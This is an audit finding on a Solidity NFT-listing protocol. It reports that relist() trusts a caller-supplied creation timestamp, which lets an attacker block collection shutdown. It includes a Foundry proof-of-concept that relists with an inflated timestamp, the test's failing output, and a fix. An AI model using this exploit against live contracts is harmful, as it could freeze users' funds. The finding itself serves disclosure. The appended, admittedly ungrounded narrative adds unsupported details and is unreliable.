---
id: 23243
severity: "High"
---

# In the Listings.sol#relist()

## Description

The core functionality of the protocol can be blocked by malicious users by not setting listing.created to block.timestamp in the function.
In the Listings.sol#relist() function, listing.created is not set to block.timestamp and it is determined based on the input parameter.
Internal pre-conditions External pre-conditions
• When a collection is illiquid and we have a disperate number of tokens spread across multiple users, a pool has to become unusable.
Attack Path
• In , a malicious user sets listing.created to type(uint).max instead of block.timestamp in the Listings.sol#relist() function.
• Next, When a collection is illiquid and we have a disperate number of tokens spread across multiple users, a pool has to become unusable.
• In , is always true, so the CollectionShutdown.sol#execute() function is always reverted.
The CollectionShutdown function that is core function of the protocol is damaged.

## Proof of Concept

```solidity
function test_CanRelistFloorItemAsLiquidListing(address _lister, address payable _relister, uint _tokenId, uint16 _floorMultiple) public {
    // Ensure that we don't get a token ID conflict
    _assumeValidTokenId(_tokenId);
    // Ensure that we don't set a zero address for our lister and filler, and that they
    // aren't the same address
    _assumeValidAddress(_lister);
    _assumeValidAddress(_relister);
    vm.assume(_lister != _relister);
    // Ensure that our listing multiplier is above 1.00
    _assumeRealisticFloorMultiple(_floorMultiple);
    // Provide a token into the core Locker to create a Floor item
    erc721a.mint(_lister, _tokenId);
    vm.startPrank(_lister);
    erc721a.approve(address(locker), _tokenId);
    uint[] memory tokenIds = new uint[](1);
    tokenIds[0] = _tokenId;
    // Rather than creating a listing, we will deposit it as a floor token
    locker.deposit(address(erc721a), tokenIds);
    vm.stopPrank();
    // Confirm that our listing user has received the underlying ERC20. From the deposit this will be
    // a straight 1:1 swap.
    ICollectionToken token = locker.collectionToken(address(erc721a));
    assertEq(token.balanceOf(_lister), 1 ether);
    vm.startPrank(_relister);
    // Provide our filler with sufficient, approved ERC20 tokens to make the relist
    uint startBalance = 0.5 ether;
    deal(address(token), _relister, startBalance);
    token.approve(address(listings), startBalance);
    // Relist our floor item into one of various collections
    listings.relist({
        _listing: IListings.CreateListing({
            collection: address(erc721a),
            tokenIds: _tokenIdToArray(_tokenId),
            listing: IListings.Listing({
                owner: _relister,
                created: uint40(type(uint32).max),
                duration: listings.MIN_LIQUID_DURATION(),
                floorMultiple: _floorMultiple
            })
        }),
        _payTaxWithEscrow: false
    });
    vm.stopPrank();
    // Confirm that the listing has been created with the expected details
    IListings.Listing memory _listing = listings.listings(address(erc721a), _tokenId);
    assertEq(_listing.created, block.timestamp);
}
```
Result:
Ran 1 test suite in 17.20ms (15.77ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)
Failing tests:
Encountered 1 failing test in test/Listings.t.sol:ListingsTest
[FAIL. Reason: assertion failed: 4294967295 != 3601; counterexample: calldata=0x102a3f2c0000000000000000000000007b71078b91e0cdf997ea0019ceaaec1e461a64ca0000000000000000000000000a255597a7458c26b0d008204a1336eb2fd6aa090000000000000000000000000000000000000000000000000000005c3b7d197caff00000000000000000000000000000000000000000000000 args=[0x7b71078b91E0CdF997EA0019cEaAeC1E461A64cA, 0x0A255597a7458C26B0D008204A1336EB2fD6AA09, 1622569146370815 [1.622e15], 109]] test_CanRelistFloorItemAsLiquidListing(address,address,uint256,uint16) (runs: 0, ￿: 0, ~: 0)
Encountered a total of 1 failing tests, 0 tests succeeded

## Recommendation

Add the follow lines to the Listings.sol#relist() function:
```solidity
function relist(CreateListing calldata _listing, bool _payTaxWithEscrow) public nonReentrant lockerNotPaused {
    // Load our tokenId
    address _collection = _listing.collection;
    uint _tokenId = _listing.tokenIds[0];
    // Read the existing listing in a single read
    Listing memory oldListing = _listings[_collection][_tokenId];
    // Ensure the caller is not the owner of the listing
    if (oldListing.owner == msg.sender) revert CallerIsAlreadyOwner();
    // Load our new Listing into memory
    Listing memory listing = _listing.listing;
    // Ensure that the existing listing is available
    (bool isAvailable, uint listingPrice) = getListingPrice(_collection, _tokenId);
    if (!isAvailable) revert ListingNotAvailable();
    // We can process a tax refund for the existing listing
    (uint _fees,) = _resolveListingTax(oldListing, _collection, true);
    if (_fees != 0) {
        emit ListingFeeCaptured(_collection, _tokenId, _fees);
    }
    // Find the underlying {CollectionToken} attached to our collection
    ICollectionToken collectionToken = locker.collectionToken(_collection);
    // If the floor multiple of the original listings is different, then this needs
    // to be paid to the original owner of the listing.
    uint listingFloorPrice = 1 ether * 10 ** collectionToken.denomination();
    if (listingPrice > listingFloorPrice) {
        unchecked {
            collectionToken.transferFrom(msg.sender, oldListing.owner, listingPrice - listingFloorPrice);
        }
    }
    // Validate our new listing
    _validateCreateListing(_listing);
    // Store our listing into our Listing mappings
    _listings[_collection][_tokenId] = listing;
    _listings[_collection][_tokenId].created = uint40(block.timestamp);
    // Pay our required taxes
    payTaxWithEscrow(address(collectionToken), getListingTaxRequired(listing, _collection), _payTaxWithEscrow);
    // Emit events
    emit ListingRelisted(_collection, _tokenId, listing);
}
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability resides in the relist function of the Listings contract where the creation timestamp of a listing is taken from the caller‑provided struct instead of being forced to the current block timestamp. Because the contract trusts this external parameter, a malicious actor can submit a listing with the created field set to the maximum unsigned integer value. The protocol’s shutdown logic checks whether the elapsed time since creation exceeds a threshold; with the created timestamp artificially inflated, the condition is always true and the CollectionShutdown execute function reverts on every call. This denial‑of‑service effect blocks the core shutdown and liquidity mechanisms, rendering pools unusable when a collection becomes illiquid. The issue manifests when a user relists a token and the UI shows the listing as active, yet subsequent operations such as pool withdrawals or shutdowns fail silently, often appearing as “nothing happens” or “funds are stuck”. It was discovered during a formal audit when the test suite asserted that the created field equals block.timestamp but observed a mismatch caused by the attacker‑controlled value. The bug is subtle because the function appears to store a normal listing and the timestamp field is not validated, making the problem easy to overlook in code reviews. Conceptually, the fix is to remove any reliance on caller‑supplied timestamps and to assign the created field internally to block.timestamp after the listing is stored, ensuring that time‑based checks reflect the true moment of creation. This class of flaw is a parameter tampering or timestamp injection that breaks business logic assumptions about the passage of time and can lead to funds becoming inaccessible until the contract is patched.
